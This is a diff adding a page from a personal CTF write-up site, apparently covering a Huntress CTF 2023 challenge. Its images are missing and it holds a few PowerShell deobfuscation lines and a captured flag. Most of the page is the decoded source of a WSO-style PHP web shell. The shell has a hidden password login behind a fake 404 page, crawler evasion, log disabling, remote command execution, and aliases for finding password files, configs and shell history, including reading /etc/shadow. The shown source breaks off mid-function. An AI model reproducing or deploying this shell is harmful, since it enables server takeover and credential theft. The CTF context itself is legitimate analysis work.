@@ -1,0 +1,1163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2023-10-06 · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="huntress/2023/2023-10-06.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/huntress/index.html">Huntress CTF</a> &rsaquo; <a href="/huntress/2023/index.html">2023</a></div>
+  <h1 id="2023-10-06">2023-10-06</h1>
+<pre><code class="language-java">13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573
+
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code class="language-powershell">$c = $k(&quot;/XAjqgQvv4067/&quot;, $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), &quot;tVEwfwrN302&quot;)));
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code class="language-powershell">$k2 = $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), &quot;tVEwfwrN302&quot;));     ### taken out of $c declaration
+echo &quot;$k \n&quot;;
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>create function<br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>got it flag{6c733ef09bc4f2a4313ff63087e25d67}</p>
+<pre><code class="language-java">global $auth_pass,$color,$default_action,$default_use_ajax,$default_charset,$sort;
+global $cwd,$os,$safe_mode, $in;
+
+$auth_pass = 'edbc761d111e1b86fb47681d9f641468';
+$color = &quot;#df5&quot;;
+$default_action = 'FilesMan';
+$default_use_ajax = true;
+$default_charset = 'Windows-1251';
+
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array(&quot;Google&quot;, &quot;Slurp&quot;, &quot;MSNBot&quot;, &quot;ia_archiver&quot;, &quot;Yandex&quot;, &quot;Rambler&quot;);
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
+
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@set_time_limit(0);
+@define('WEBAPP_VERSION', '0.00');
+
+if(get_magic_quotes_gpc()) {
+    function WSOstripslashes($array) {
+        return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array);
+    }
+    $_POST = WSOstripslashes($_POST);
+    $_COOKIE = WSOstripslashes($_COOKIE);
+}
+
+function wsoLogin() {
+    //die(&quot;&lt;pre align=center&gt;&lt;form method=post&gt;Password: &lt;input type=password name=pass&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/pre&gt;&quot;);
+    header(&quot;HTTP/1.0 404 Not Found&quot;);
+    echo &quot;&lt;html&gt;&lt;head&gt;
+    &lt;title&gt;404 Not Found&lt;/title&gt;
+    &lt;/head&gt;&lt;body&gt;
+    &lt;h1&gt;Not Found&lt;/h1&gt;
+    &lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+    &lt;hr&gt;
+    &lt;address&gt;Apache/2.2.22 (Linux) Server at Port &lt;small onclick=\&quot;document.getElementById('login').style.display = 'block';\&quot;&gt;80&lt;/small&gt;&lt;/address&gt;
+    &lt;/body&gt;&lt;/html&gt;&lt;div id=\&quot;login\&quot; style=\&quot;display:none;\&quot;&gt;&lt;pre align=center&gt;&lt;form method=post&gt;Password: &lt;input type=password name=pass&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/pre&gt;&lt;/div&gt;&quot;;
+    exit();
+}
+
+function actionLogout() {
+    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
+    die('bye!');
+}
+
+function WSOsetcookie($k, $v) {
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v);
+}
+
+if(!empty($auth_pass)) {
+    if(isset($_POST['pass']) &amp;&amp; (md5($_POST['pass']) == $auth_pass))
+        WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
+        wsoLogin();
+}
+
+if(strtolower(substr(PHP_OS,0,3)) == &quot;win&quot;)
+    $os = 'win';
+else
+    $os = 'nix';
+
+$safe_mode = @ini_get('safe_mode');
+if(!$safe_mode)
+    error_reporting(0);
+
+$disable_functions = @ini_get('disable_functions');
+$home_cwd = @getcwd();
+if(isset($_POST['c']))
+    @chdir($_POST['c']);
+$cwd = @getcwd();
+if($os == 'win') {
+    $home_cwd = str_replace(&quot;\\&quot;, &quot;/&quot;, $home_cwd);
+    $cwd = str_replace(&quot;\\&quot;, &quot;/&quot;, $cwd);
+}
+if($cwd[strlen($cwd)-1] != '/')
+    $cwd .= '/';
+
+if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
+    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$default_use_ajax;
+
+if($os == 'win')
+    $aliases = array(
+        &quot;List Directory&quot; =&gt; &quot;dir&quot;,
+        &quot;Find index.php in current dir&quot; =&gt; &quot;dir /s /w /b index.php&quot;,
+        &quot;Find *config*.php in current dir&quot; =&gt; &quot;dir /s /w /b *config*.php&quot;,
+        &quot;Show active connections&quot; =&gt; &quot;netstat -an&quot;,
+        &quot;Show running services&quot; =&gt; &quot;net start&quot;,
+        &quot;User accounts&quot; =&gt; &quot;net user&quot;,
+        &quot;Show computers&quot; =&gt; &quot;net view&quot;,
+        &quot;ARP Table&quot; =&gt; &quot;arp -a&quot;,
+        &quot;IP Configuration&quot; =&gt; &quot;ipconfig /all&quot;
+    );
+else
+    $aliases = array(
+        &quot;List dir&quot; =&gt; &quot;ls -lha&quot;,
+        &quot;list file attributes on a Linux second extended file system&quot; =&gt; &quot;lsattr -va&quot;,
+        &quot;show opened ports&quot; =&gt; &quot;netstat -an | grep -i listen&quot;,
+        &quot;process status&quot; =&gt; &quot;ps aux&quot;,
+        &quot;Find&quot; =&gt; &quot;&quot;,
+        &quot;find all suid files&quot; =&gt; &quot;find / -type f -perm -04000 -ls&quot;,
+        &quot;find suid files in current dir&quot; =&gt; &quot;find . -type f -perm -04000 -ls&quot;,
+        &quot;find all sgid files&quot; =&gt; &quot;find / -type f -perm -02000 -ls&quot;,
+        &quot;find sgid files in current dir&quot; =&gt; &quot;find . -type f -perm -02000 -ls&quot;,
+        &quot;find config.inc.php files&quot; =&gt; &quot;find / -type f -name config.inc.php&quot;,
+        &quot;find config* files&quot; =&gt; &quot;find / -type f -name \&quot;config*\&quot;&quot;,
+        &quot;find config* files in current dir&quot; =&gt; &quot;find . -type f -name \&quot;config*\&quot;&quot;,
+        &quot;find all writable folders and files&quot; =&gt; &quot;find / -perm -2 -ls&quot;,
+        &quot;find all writable folders and files in current dir&quot; =&gt; &quot;find . -perm -2 -ls&quot;,
+        &quot;find all service.pwd files&quot; =&gt; &quot;find / -type f -name service.pwd&quot;,
+        &quot;find service.pwd files in current dir&quot; =&gt; &quot;find . -type f -name service.pwd&quot;,
+        &quot;find all .htpasswd files&quot; =&gt; &quot;find / -type f -name .htpasswd&quot;,
+        &quot;find .htpasswd files in current dir&quot; =&gt; &quot;find . -type f -name .htpasswd&quot;,
+        &quot;find all .bash_history files&quot; =&gt; &quot;find / -type f -name .bash_history&quot;,
+        &quot;find .bash_history files in current dir&quot; =&gt; &quot;find . -type f -name .bash_history&quot;,
+        &quot;find all .fetchmailrc files&quot; =&gt; &quot;find / -type f -name .fetchmailrc&quot;,
+        &quot;find .fetchmailrc files in current dir&quot; =&gt; &quot;find . -type f -name .fetchmailrc&quot;,
+        &quot;Locate&quot; =&gt; &quot;&quot;,
+        &quot;locate httpd.conf files&quot; =&gt; &quot;locate httpd.conf&quot;,
+        &quot;locate vhosts.conf files&quot; =&gt; &quot;locate vhosts.conf&quot;,
+        &quot;locate proftpd.conf files&quot; =&gt; &quot;locate proftpd.conf&quot;,
+        &quot;locate psybnc.conf files&quot; =&gt; &quot;locate psybnc.conf&quot;,
+        &quot;locate my.conf files&quot; =&gt; &quot;locate my.conf&quot;,
+        &quot;locate admin.php files&quot; =&gt;&quot;locate admin.php&quot;,
+        &quot;locate cfg.php files&quot; =&gt; &quot;locate cfg.php&quot;,
+        &quot;locate conf.php files&quot; =&gt; &quot;locate conf.php&quot;,
+        &quot;locate config.dat files&quot; =&gt; &quot;locate config.dat&quot;,
+        &quot;locate config.php files&quot; =&gt; &quot;locate config.php&quot;,
+        &quot;locate config.inc files&quot; =&gt; &quot;locate config.inc&quot;,
+        &quot;locate config.inc.php&quot; =&gt; &quot;locate config.inc.php&quot;,
+        &quot;locate config.default.php files&quot; =&gt; &quot;locate config.default.php&quot;,
+        &quot;locate config* files &quot; =&gt; &quot;locate config&quot;,
+        &quot;locate .conf files&quot;=&gt;&quot;locate '.conf'&quot;,
+        &quot;locate .pwd files&quot; =&gt; &quot;locate '.pwd'&quot;,
+        &quot;locate .sql files&quot; =&gt; &quot;locate '.sql'&quot;,
+        &quot;locate .htpasswd files&quot; =&gt; &quot;locate '.htpasswd'&quot;,
+        &quot;locate .bash_history files&quot; =&gt; &quot;locate '.bash_history'&quot;,
+        &quot;locate .mysql_history files&quot; =&gt; &quot;locate '.mysql_history'&quot;,
+        &quot;locate .fetchmailrc files&quot; =&gt; &quot;locate '.fetchmailrc'&quot;,
+        &quot;locate backup files&quot; =&gt; &quot;locate backup&quot;,
+        &quot;locate dump files&quot; =&gt; &quot;locate dump&quot;,
+        &quot;locate priv files&quot; =&gt; &quot;locate priv&quot;
+    );
+
+function wsoHeader() {
+    if(empty($_POST['charset']))
+        $_POST['charset'] = $GLOBALS['default_charset'];
+    global $color;
+    echo &quot;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv='Content-Type' content='text/html; charset=&quot; . $_POST['charset'] . &quot;'&gt;&lt;title&gt;&quot; . $_SERVER['HTTP_HOST'] . &quot; &quot; . '' .&quot;&lt;/title&gt;
+&lt;style&gt;
+body{background-color:#444;color:#e1e1e1;}
+body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
+table.info{ color:#fff;background-color:#222; }
+span,h1,a{ color: $color !important; }
+span{ font-weight: bolder; }
+h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
+div.content{ padding: 5px;margin-left:5px;background-color:#333; }
+a{ text-decoration:none; }
+a:hover{ text-decoration:underline; }
+.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
+.bigarea{ width:100%;height:300px; }
+input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
+form{ margin:0px; }
+#toolsTbl{ text-align:center; }
+.toolsInp{ width: 300px }
+.main th{text-align:left;background-color:#5e5e5e;}
+.main tr:hover{background-color:#5e5e5e}
+.l1{background-color:#444}
+.l2{background-color:#333}
+pre{font-family:Courier,Monospace;}
+&lt;/style&gt;
+&lt;script&gt;
+    var c_ = '&quot; . htmlspecialchars($GLOBALS['cwd']) . &quot;';
+    var a_ = '&quot; . htmlspecialchars(@$_POST['a']) .&quot;'
+    var charset_ = '&quot; . htmlspecialchars(@$_POST['charset']) .&quot;';
+    var p1_ = '&quot; . ((strpos(@$_POST['p1'],&quot;\n&quot;)!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) .&quot;';
+    var p2_ = '&quot; . ((strpos(@$_POST['p2'],&quot;\n&quot;)!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) .&quot;';
+    var p3_ = '&quot; . ((strpos(@$_POST['p3'],&quot;\n&quot;)!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) .&quot;';
+    var d = document;
+    function set(a,c,p1,p2,p3,charset) {
+        if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
+        if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
+        if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
+        if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
+        if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
+        if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
+    }
+    function g(a,c,p1,p2,p3,charset) {
+        set(a,c,p1,p2,p3,charset);
+        d.mf.submit();
+    }
+    function a(a,c,p1,p2,p3,charset) {
+        set(a,c,p1,p2,p3,charset);
+        var params = 'ajax=true';
+        for(i=0;i&lt;d.mf.elements.length;i++)
+            params += '&amp;'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
+        sr('&quot; . addslashes($_SERVER['REQUEST_URI']) .&quot;', params);
+    }
+    function sr(url, params) {
+        if (window.XMLHttpRequest)
+            req = new XMLHttpRequest();
+        else if (window.ActiveXObject)
+            req = new ActiveXObject('Microsoft.XMLHTTP');
+        if (req) {
+            req.onreadystatechange = processReqChange;
+            req.open('POST', url, true);
+            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
+            req.send(params);
+        }
+    }
+    function processReqChange() {
+        if( (req.readyState == 4) )
+            if(req.status == 200) {
+                var reg = new RegExp(\&quot;(\\\\d+)([\\\\S\\\\s]*)\&quot;, 'm');
+                var arr=reg.exec(req.responseText);
+                eval(arr[2].substr(0, arr[1]));
+            } else alert('Request error!');
+    }
+&lt;/script&gt;
+&lt;head&gt;&lt;body&gt;&lt;div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'&gt;
+&lt;form method=post name=mf style='display:none;'&gt;
+&lt;input type=hidden name=p3&gt;
+&lt;input type=hidden name=a&gt;
+&lt;input type=hidden name=charset&gt;
+&lt;input type=hidden name=p2&gt;
+&lt;input type=hidden name=c&gt;
+&lt;input type=hidden name=p1&gt;
+&lt;/form&gt;&quot;;
+    $freeSpace = @diskfreespace($GLOBALS['cwd']);
+    $totalSpace = @disk_total_space($GLOBALS['cwd']);
+    $totalSpace = $totalSpace?$totalSpace:1;
+    $release = @php_uname('r');
+    $kernel = @php_uname('s');
+    $explink = 'http://exploit-db.com/search/?action=search&amp;filter_description=';
+    if(strpos('Linux', $kernel) !== false)
+        $explink .= urlencode('Linux Kernel ' . substr($release,0,6));
+    else
+        $explink .= urlencode($kernel . ' ' . substr($release,0,3));
+    if(!function_exists('posix_getegid')) {
+        $user = @get_current_user();
+        $uid = @getmyuid();
+        $gid = @getmygid();
+        $group = &quot;?&quot;;
+    } else {
+        $uid = @posix_getpwuid(posix_geteuid());
+        $gid = @posix_getgrgid(posix_getegid());
+        $user = $uid['name'];
+        $uid = $uid['uid'];
+        $group = $gid['name'];
+        $gid = $gid['gid'];
+    }
+
+    $cwd_links = '';
+    $path = explode(&quot;/&quot;, $GLOBALS['cwd']);
+    $n=count($path);
+    for($i=0; $i&lt;$n-1; $i++) {
+        $cwd_links .= &quot;&lt;a href='#' onclick='g(\&quot;FilesMan\&quot;,\&quot;&quot;;
+        for($j=0; $j&lt;=$i; $j++)
+            $cwd_links .= $path[$j].'/';
+        $cwd_links .= &quot;\&quot;)'&gt;&quot;.$path[$i].&quot;/&lt;/a&gt;&quot;;
+    }
+
+    $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
+    $opt_charsets = '';
+    foreach($charsets as $item)
+        $opt_charsets .= '&lt;option value=&quot;'.$item.'&quot; '.($_POST['charset']==$item?'selected':'').'&gt;'.$item.'&lt;/option&gt;';
+
+    $m = array('Sec. Info'=&gt;'SecInfo','Files'=&gt;'FilesMan','Console'=&gt;'Console','Sql'=&gt;'Sql','Php'=&gt;'Php','String tools'=&gt;'StringTools','Bruteforce'=&gt;'Bruteforce','Network'=&gt;'Network', 'Logout' =&gt; 'Logout');
+    if(!empty($GLOBALS['auth_pass']))
+        $m['Logout'] = 'Logout';
+    $m['Self remove'] = 'SelfRemove';
+    $menu = '';
+    foreach($m as $k =&gt; $v)
+        $menu .= '&lt;th width=&quot;'.(int)(100/count($m)).'%&quot;&gt;[ &lt;a href=&quot;#&quot; onclick=&quot;g(\''.$v.'\',null,\'\',\'\',\'\')&quot;&gt;'.$k.'&lt;/a&gt; ]&lt;/th&gt;';
+
+    $drives = &quot;&quot;;
+    if($GLOBALS['os'] == 'win') {
+        foreach(range('c','z') as $drive)
+        if(is_dir($drive.':\\'))
+            $drives .= '&lt;a href=&quot;#&quot; onclick=&quot;g(\'FilesMan\',\''.$drive.':/\')&quot;&gt;[ '.$drive.' ]&lt;/a&gt; ';
+    }
+    echo '&lt;table class=info cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;&lt;td width=1&gt;&lt;span&gt;Uname:&lt;br&gt;User:&lt;br&gt;Php:&lt;br&gt;Hdd:&lt;br&gt;Cwd:' . ($GLOBALS['os'] == 'win'?'&lt;br&gt;Drives:':'') . '&lt;/span&gt;&lt;/td&gt;'
+       . '&lt;td&gt;&lt;nobr&gt;' . substr(@php_uname(), 0, 120) . ' &lt;a href=&quot;' . $explink . '&quot; target=_blank&gt;[exploit-db.com]&lt;/a&gt;&lt;/nobr&gt;&lt;br&gt;' . $uid . ' ( ' . $user . ' ) &lt;span&gt;Group:&lt;/span&gt; ' . $gid . ' ( ' . $group . ' )&lt;br&gt;' . @phpversion() . ' &lt;span&gt;Safe mode:&lt;/span&gt; ' . ($GLOBALS['safe_mode']?'&lt;font color=red&gt;ON&lt;/font&gt;':'&lt;font color=green&gt;&lt;b&gt;OFF&lt;/b&gt;&lt;/font&gt;')
+       . ' &lt;a href=# onclick=&quot;g(\'Php\',null,\'\',\'info\')&quot;&gt;[ phpinfo ]&lt;/a&gt; &lt;span&gt;Datetime:&lt;/span&gt; ' . date('Y-m-d H:i:s') . '&lt;br&gt;' . wsoViewSize($totalSpace) . ' &lt;span&gt;Free:&lt;/span&gt; ' . wsoViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)&lt;br&gt;' . $cwd_links . ' '. wsoPermsColor($GLOBALS['cwd']) . ' &lt;a href=# onclick=&quot;g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')&quot;&gt;[ home ]&lt;/a&gt;&lt;br&gt;' . $drives . '&lt;/td&gt;'
+       . '&lt;td width=1 align=right&gt;&lt;nobr&gt;&lt;select onchange=&quot;g(null,null,null,null,null,this.value)&quot;&gt;&lt;optgroup label=&quot;Page charset&quot;&gt;' . $opt_charsets . '&lt;/optgroup&gt;&lt;/select&gt;&lt;br&gt;&lt;span&gt;Server IP:&lt;/span&gt;&lt;br&gt;' . @$_SERVER[&quot;SERVER_ADDR&quot;] . '&lt;br&gt;&lt;span&gt;Client IP:&lt;/span&gt;&lt;br&gt;' . $_SERVER['REMOTE_ADDR'] . '&lt;/nobr&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;'
+       . '&lt;table style=&quot;border-top:2px solid #333;&quot; cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;' . $menu . '&lt;/tr&gt;&lt;/table&gt;&lt;div style=&quot;margin:5&quot;&gt;';
+}
+
+function wsoFooter() {
+    $is_writable = is_writable($GLOBALS['cwd'])?&quot; &lt;font color='green'&gt;(Writeable)&lt;/font&gt;&quot;:&quot; &lt;font color=red&gt;(Not writable)&lt;/font&gt;&quot;;
+    echo &quot;
+&lt;/div&gt;
+&lt;table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'&gt;
+    &lt;tr&gt;
+        &lt;td&gt;&lt;form onsubmit='g(null,this.c.value,\&quot;\&quot;);return false;'&gt;&lt;span&gt;Change dir:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=c value='&quot; . htmlspecialchars($GLOBALS['cwd']) .&quot;'&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
+        &lt;td&gt;&lt;form onsubmit=\&quot;g('FilesTools',null,this.f.value);return false;\&quot;&gt;&lt;span&gt;Read file:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
+    &lt;/tr&gt;&lt;tr&gt;
+        &lt;td&gt;&lt;form onsubmit=\&quot;g('FilesMan',null,'mkdir',this.d.value);return false;\&quot;&gt;&lt;span&gt;Make dir:&lt;/span&gt;$is_writable&lt;br&gt;&lt;input class='toolsInp' type=text name=d&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
+        &lt;td&gt;&lt;form onsubmit=\&quot;g('FilesTools',null,this.f.value,'mkfile');return false;\&quot;&gt;&lt;span&gt;Make file:&lt;/span&gt;$is_writable&lt;br&gt;&lt;input class='toolsInp' type=text name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
+    &lt;/tr&gt;&lt;tr&gt;
+        &lt;td&gt;&lt;form onsubmit=\&quot;g('Console',null,this.c.value);return false;\&quot;&gt;&lt;span&gt;Execute:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=c value=''&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
+        &lt;td&gt;&lt;form method='post' ENCTYPE='multipart/form-data'&gt;
+        &lt;input type=hidden name=a value='FilesMAn'&gt;
+        &lt;input type=hidden name=c value='&quot; . $GLOBALS['cwd'] .&quot;'&gt;
+        &lt;input type=hidden name=p1 value='uploadFile'&gt;
+        &lt;input type=hidden name=charset value='&quot; . (isset($_POST['charset'])?$_POST['charset']:'') . &quot;'&gt;
+        &lt;span&gt;Upload file:&lt;/span&gt;$is_writable&lt;br&gt;&lt;input class='toolsInp' type=file name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;br  &gt;&lt;/td&gt;
+    &lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
+}
+
+if (!function_exists(&quot;posix_getpwuid&quot;) &amp;&amp; (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) {
+    function posix_getpwuid($p) {return false;} }
+if (!function_exists(&quot;posix_getgrgid&quot;) &amp;&amp; (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) {
+    function posix_getgrgid($p) {return false;} }
+
+function wsoEx($in) {
+    $out = '';
+    if (function_exists('exec')) {
+        @exec($in,$out);
+        $out = @join(&quot;\n&quot;,$out);
+    } elseif (function_exists('passthru')) {
+        ob_start();
+        @passthru($in);
+        $out = ob_get_clean();
+    } elseif (function_exists('system')) {
+        ob_start();
+        @system($in);
+        $out = ob_get_clean();
+    } elseif (function_exists('shell_exec')) {
+        $out = shell_exec($in);
+    } elseif (is_resource($f = @popen($in,&quot;r&quot;))) {
+        $out = &quot;&quot;;
+        while(!@feof($f))
+            $out .= fread($f,1024);
+        pclose($f);
+    }
+    return $out;
+}
+
+function wsoViewSize($s) {
+    if (is_int($s))
+        $s = sprintf(&quot;%u&quot;, $s);
+
+    if($s &gt;= 1073741824)
+        return sprintf('%1.2f', $s / 1073741824 ). ' GB';
+    elseif($s &gt;= 1048576)
+        return sprintf('%1.2f', $s / 1048576 ) . ' MB';
+    elseif($s &gt;= 1024)
+        return sprintf('%1.2f', $s / 1024 ) . ' KB';
+    else
+        return $s . ' B';
+}
+
+function wsoPerms($p) {
+   return substr(sprintf('%o', $p), -4);
+}
+
+function wsoPermsColor($f) {
+    if (!@is_readable($f))
+        return '&lt;font color=#FF0000&gt;' . wsoPerms(@fileperms($f)) . '&lt;/font&gt;';
+    elseif (!@is_writable($f))
+        return '&lt;font color=white&gt;' . wsoPerms(@fileperms($f)) . '&lt;/font&gt;';
+    else
+        return '&lt;font color=#25ff00&gt;' . wsoPerms(@fileperms($f)) . '&lt;/font&gt;';
+}
+
+function wsoScandir($dir) {
+    if(function_exists(&quot;scandir&quot;)) {
+        return scandir($dir);
+    } else {
+        $dh  = opendir($dir);
+        while (false !== ($filename = readdir($dh)))
+            $files[] = $filename;
+        return $files;
+    }
+}
+
+function wsoWhich($p) {
+    $path = wsoEx('which ' . $p);
+    if(!empty($path))
+        return $path;
+    return false;
+}
+
+function actionSecInfo() {
+    wsoHeader();
+    echo '&lt;h1&gt;Server security information&lt;/h1&gt;&lt;div class=content&gt;';
+    function wsoSecParam($n, $v) {
+        $v = trim($v);
+        if($v) {
+            echo '&lt;span&gt;' . $n . ': &lt;/span&gt;';
+            if(strpos($v, &quot;\n&quot;) === false)
+                echo $v . '&lt;br&gt;';
+            else
+                echo '&lt;pre class=ml1&gt;' . $v . '&lt;/pre&gt;';
+        }
+    }
+
+    wsoSecParam('Server software', @getenv('SERVER_SOFTWARE'));
+    if(function_exists('apache_get_modules'))
+        wsoSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
+    wsoSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
+    wsoSecParam('Open base dir', @ini_get('open_basedir'));
+    wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
+    wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
+    wsoSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
+    $temp=array();
+    if(function_exists('mysql_get_client_info'))
+        $temp[] = &quot;MySql (&quot;.mysql_get_client_info().&quot;)&quot;;
+    if(function_exists('mssql_connect'))
+        $temp[] = &quot;MSSQL&quot;;
+    if(function_exists('pg_connect'))
+        $temp[] = &quot;PostgreSQL&quot;;
+    if(function_exists('oci_connect'))
+        $temp[] = &quot;Oracle&quot;;
+    wsoSecParam('Supported databases', implode(', ', $temp));
+    echo '&lt;br&gt;';
+
+    if($GLOBALS['os'] == 'nix') {
+            wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?&quot;yes &lt;a href='#' onclick='g(\&quot;FilesTools\&quot;, \&quot;/etc/\&quot;, \&quot;passwd\&quot;)'&gt;[view]&lt;/a&gt;&quot;:'no');
+            wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?&quot;yes &lt;a href='#' onclick='g(\&quot;FilesTools\&quot;, \&quot;/etc/\&quot;, \&quot;shadow\&quot;)'&gt;[view]&lt;/a&gt;&quot;:'no');
+            wsoSecParam('OS version', @file_get_contents('/proc/version'));
+            wsoSecParam('Distr name', @file_get_contents('/etc/issue.net'));
+            if(!$GLOBALS['safe_mode']) {
+                $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
+                $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
+                $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
+                echo '&lt;br&gt;';
+                $temp=array();
+                foreach ($userful as $item)
+                    if(wsoWhich($item))
+                        $temp[] = $item;
+                wsoSecParam('Userful', implode(', ',$temp));
+                $temp=array();
+                foreach ($danger as $item)
+                    if(wsoWhich($item))
+                        $temp[] = $item;
+                wsoSecParam('Danger', implode(', ',$temp));
+                $temp=array();
+                foreach ($downloaders as $item)
+                    if(wsoWhich($item))
+                        $temp[] = $item;
+                wsoSecParam('Downloaders', implode(', ',$temp));
+                echo '&lt;br/&gt;';
+                wsoSecParam('HDD space', wsoEx('df -h'));
+                wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));
+                echo '&lt;br/&gt;&lt;span&gt;posix_getpwuid (&quot;Read&quot; /etc/passwd)&lt;/span&gt;&lt;table&gt;&lt;form onsubmit=\'g(null,null,&quot;5&quot;,this.param1.value,this.param2.value);return false;\'&gt;&lt;tr&gt;&lt;td&gt;From&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param1 value=0&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;To&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param2 value=1000&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;';
+                if (isset ($_POST['p2'], $_POST['p3']) &amp;&amp; is_numeric($_POST['p2']) &amp;&amp; is_numeric($_POST['p3'])) {
+                    $temp = &quot;&quot;;
+                    for(;$_POST['p2'] &lt;= $_POST['p3'];$_POST['p2']++) {
+                        $uid = @posix_getpwuid($_POST['p2']);
+                        if ($uid)
+                            $temp .= join(':',$uid).&quot;\n&quot;;
+                    }
+                    echo '&lt;br/&gt;';
+                    wsoSecParam('Users', $temp);
+                }
+            }
+    } else {
+        wsoSecParam('OS Version',wsoEx('ver'));
